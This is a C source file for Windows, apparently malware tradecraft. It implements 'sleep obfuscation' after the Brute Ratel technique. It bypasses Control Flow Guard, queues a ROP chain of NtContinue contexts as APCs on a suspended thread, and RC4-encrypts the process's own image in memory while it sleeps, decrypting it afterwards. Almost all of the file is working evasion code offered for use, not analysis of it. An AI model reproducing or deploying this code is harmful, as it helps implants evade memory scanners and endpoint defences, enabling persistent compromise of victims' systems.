#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "WindowsApp")

typedef struct _USTRING {
    ULONG Length;
    ULONG MaximumLength;
    PVOID Buffer;
} USTRING, * PUSTRING;

typedef NTSTATUS(NTAPI* FuncNtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
typedef NTSTATUS(NTAPI* FuncZwDuplicateObject)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle,
    PHANDLE TargetHandle, ACCESS_MASK DesiredAccess,ULONG HandleAttributes, ULONG Options );
typedef NTSTATUS(NTAPI* FuncNtTestAlert)(VOID);
typedef NTSTATUS(NTAPI* FuncNtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaiteHandle, BOOL Alertable, PLARGE_INTEGER Timeout);
typedef NTSTATUS(NTAPI* FuncNtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
typedef NTSTATUS(NTAPI* FuncNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtection, PULONG OldProtection);

// add CFG Bypass reference brc4
BOOL AddCFGAllowListsNtdll(PVOID Addreess) {
    PVOID ntdllBase = (PVOID)GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(DosHeader->e_lfanew + (BYTE*)DosHeader);
    SIZE_T SizeOfImage = (SIZE_T)NtHeader->OptionalHeader.SizeOfImage;

    // align to page size
    SIZE_T RegionSize = (SizeOfImage + 0xFFF) & 0xFFFFF000;

    CFG_CALL_TARGET_INFO CallTargetInfo = { 0 };
    CallTargetInfo.Offset = (ULONG64)Addreess - (ULONG64)ntdllBase;
    CallTargetInfo.Flags = CFG_CALL_TARGET_VALID;

    BOOL bRet = SetProcessValidCallTargets((HANDLE)-1, ntdllBase, RegionSize, 1, &CallTargetInfo);

    // target not in CFG 
    if (GetLastError() == 87) {
        return TRUE;
    }

    if (!bRet) {
        printf("Add CFG Allow List Failed. Error:%lu\n", GetLastError());
    }
    return bRet;
}

BOOL AddCFGAllowListsKernel32(PVOID Addreess) {
    PVOID kernelBase = (PVOID)GetModuleHandleA("kernel32.dll");
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)kernelBase;
    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(DosHeader->e_lfanew + (BYTE*)DosHeader);
    SIZE_T SizeOfImage = (SIZE_T)NtHeader->OptionalHeader.SizeOfImage;

    // align to page size
    SIZE_T RegionSize = (SizeOfImage + 0xFFF) & 0xFFFFF000;

    CFG_CALL_TARGET_INFO CallTargetInfo = { 0 };
    CallTargetInfo.Offset = (ULONG64)Addreess - (ULONG64)kernelBase;
    CallTargetInfo.Flags = CFG_CALL_TARGET_VALID;

    BOOL bRet = SetProcessValidCallTargets((HANDLE)-1, kernelBase, RegionSize, 1, &CallTargetInfo);

    // target not in CFG 
    if (GetLastError() == 87) {
        return TRUE;
    }

    if (!bRet) {
        printf("Add CFG Allow List Failed. Error:%lu\n", GetLastError());
    }
    return bRet;
}

BOOL SleepObfuscation(ULONG SleepTimes) {
    printf("Start Fucking Sleeping Masking.....\n");
    LPVOID  TpReleaseCleanupGroupMembers_450 = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpReleaseCleanupGroupMembers") + 0x450;

    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(NULL, 0, TpReleaseCleanupGroupMembers_450, NULL, CREATE_SUSPENDED, &dwThreadId);
    if (!hThread) {
        printf("CreateThread failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    HANDLE ThreadHandle = hThread;
	HANDLE TargetHandle = NULL;

    CONTEXT CtxThread = { 0 };

    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopSleep = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopRtlEtTd = { 0 };
    CONTEXT RopWaitFor = { 0 };

	CtxThread.ContextFlags = CONTEXT_FULL;

    PVOID SystemFunction032 = GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
    PVOID NtContinue = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
    PVOID RtlExitUserThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlExitUserThread");
    FuncNtAlertResumeThread pNtAlertResumeThread = (FuncNtAlertResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlertResumeThread");
	FuncZwDuplicateObject pZwDuplicateObject = (FuncZwDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwDuplicateObject");
    FuncNtTestAlert pNtTestAlert = (FuncNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
    FuncNtSignalAndWaitForSingleObject  pNtSignalAndWaitForSingleObject = (FuncNtSignalAndWaitForSingleObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSignalAndWaitForSingleObject");

    ULONG64 ImageBase = GetModuleHandleA(NULL);
    ULONG ImageSize = ((PIMAGE_NT_HEADERS)(ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)((BYTE*)ImageBase + DosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = &NtHeader->OptionalHeader;
    BOOL IsCFGCompiled = (OptionalHeader->DllCharacteristics & IMAGE_DLLCHARACTERISTICS_GUARD_CF) != 0;

    if (IsCFGCompiled) {
        AddCFGAllowListsNtdll(NtContinue);
        AddCFGAllowListsNtdll(RtlExitUserThread);
        AddCFGAllowListsNtdll(pNtTestAlert);
        AddCFGAllowListsKernel32(VirtualProtect);
        AddCFGAllowListsKernel32(WaitForSingleObject);
    }

    ULONG oldProtect = 0;
    CHAR KeyArray[16] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66 };

    USTRING Key = { 0 };
    Key.Length = 16;
    Key.MaximumLength = 16;
    Key.Buffer = KeyArray;

    USTRING Image = { 0 };
    Image.Length = ImageSize;
    Image.MaximumLength = ImageSize;
    Image.Buffer = ImageBase;

    HANDLE StartEventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);
    
    NTSTATUS status = pZwDuplicateObject((HANDLE)-1, (HANDLE)-2, (HANDLE)-1, &TargetHandle, 0x1F03FF, 0, 0);
    if (!NT_SUCCESS(status)) {
        printf("ZwDuplicateObject failed, NTSTATUS = 0x%08X\n", status);
        return FALSE;
    }

    if (!GetThreadContext(ThreadHandle, &CtxThread)) {
        printf("GetThreadContext failed With Error:%lu\n", GetLastError());
        return FALSE;
    }

	memcpy(&RopWaitFor, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopProtRW,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemEnc,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopSleep,   &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemDec,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopProtRX,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopRtlEtTd, &CtxThread, sizeof(CONTEXT));

    // ROP
    RopWaitFor.Rcx = StartEventHandle;
    RopWaitFor.Rdx = INFINITE;
    *(PULONG64)RopWaitFor.Rsp = (ULONG64)pNtTestAlert;
    RopWaitFor.Rip = WaitForSingleObject;

    RopProtRW.Rcx = ImageBase;
    RopProtRW.Rdx = ImageSize;
    RopProtRW.R8 = PAGE_READWRITE;
    RopProtRW.R9 = &oldProtect;
    *(PULONG64)RopProtRW.Rsp = (ULONG64)pNtTestAlert;
    RopProtRW.Rip = VirtualProtect;

    RopMemEnc.Rcx = &Image;
    RopMemEnc.Rdx = &Key;
    RopMemEnc.Rip = SystemFunction032;
    *(PULONG64)RopMemEnc.Rsp = (ULONG64)pNtTestAlert;

    RopSleep.Rcx = (HANDLE)-1;
    RopSleep.Rdx = SleepTimes * 1000;
    RopSleep.R8 = FALSE;
    *(PULONG64)RopSleep.Rsp = (ULONG64)pNtTestAlert;
    RopSleep.Rip = WaitForSingleObjectEx;

    RopMemDec.Rcx = &Image;
    RopMemDec.Rdx = &Key;
    *(PULONG64)RopMemDec.Rsp = (ULONG64)pNtTestAlert;
    RopMemDec.Rip = SystemFunction032;

    RopProtRX.Rcx = ImageBase;
    RopProtRX.Rdx = ImageSize;
    RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
    RopProtRX.R9 = &oldProtect;
    *(PULONG64)RopProtRX.Rsp = (ULONG64)pNtTestAlert;
    RopProtRX.Rip = VirtualProtect;

    RopRtlEtTd.Rcx = 0;
    *(PULONG64)RopRtlEtTd.Rsp = (ULONG64)pNtTestAlert;
    RopRtlEtTd.Rip = RtlExitUserThread;

    if ((int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopWaitFor) > 0
     && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopProtRW)  > 0
     && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopMemEnc)  > 0
	 && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopSleep)   > 0
     && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopProtRX)  > 0
	 && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopMemDec)  > 0
     && (int)QueueUserAPC((PAPCFUNC)NtContinue, ThreadHandle, (ULONG_PTR)&RopRtlEtTd) > 0) 
    {
        ULONG SuspendCount = 0;
        NTSTATUS status = pNtAlertResumeThread(ThreadHandle, &SuspendCount);
        if (!NT_SUCCESS(status)) {
            printf("NtAlertResumeThread failed, NTSTATUS = 0x%08X\n", status);
            return FALSE;
        }
        pNtSignalAndWaitForSingleObject(StartEventHandle, ThreadHandle, FALSE, NULL);

	}
    
	CloseHandle(StartEventHandle);
	CloseHandle(ThreadHandle);
	CloseHandle(TargetHandle);
	return TRUE;
} 

int main() {
    printf("Sleep Obfuscation Demo\n");
    printf("======================\n");
    ULONG SleepTimes = 20;
    while(1){
        SleepObfuscation(SleepTimes);
	}
    return 0;
}   